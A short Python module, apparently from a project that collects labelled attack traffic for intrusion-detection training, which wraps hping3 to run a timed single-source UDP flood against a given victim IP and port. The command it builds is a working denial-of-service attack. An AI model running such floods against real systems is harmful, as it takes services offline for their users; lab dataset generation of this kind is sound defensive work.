"""DDoS attack (taxonomy Table 5.2). Wraps hping3 (UDP flood).

NOTE: with a single attacker VM this is a single-source volumetric flood, not a
truly distributed attack. Every record from this module notes that explicitly
so downstream labelling/evaluation doesn't overclaim.
"""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_timed_subprocess,
)

SINGLE_SOURCE_NOTE = "single-attacker volumetric flood, not distributed"


def build_command(victim_ip: str, port: int) -> list[str]:
    return ["hping3", "--udp", "--flood", "-V", "-p", str(port), victim_ip]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"port": 80, "duration": 30}
    it = iter(extra)
    for arg in it:
        if arg == "--port":
            parsed["port"] = int(next(it))
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    port: int = 80,
    duration: float = 30,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"port": port, "duration": duration}

    def body():
        check_tools(["hping3"])
        run_timed_subprocess(build_command(victim_ip, port), duration)
        return {"notes": SINGLE_SOURCE_NOTE}

    return run_attack("ddos", "hping3", attacker_ip, victim_ip, out_dir, params, body, dry_run)
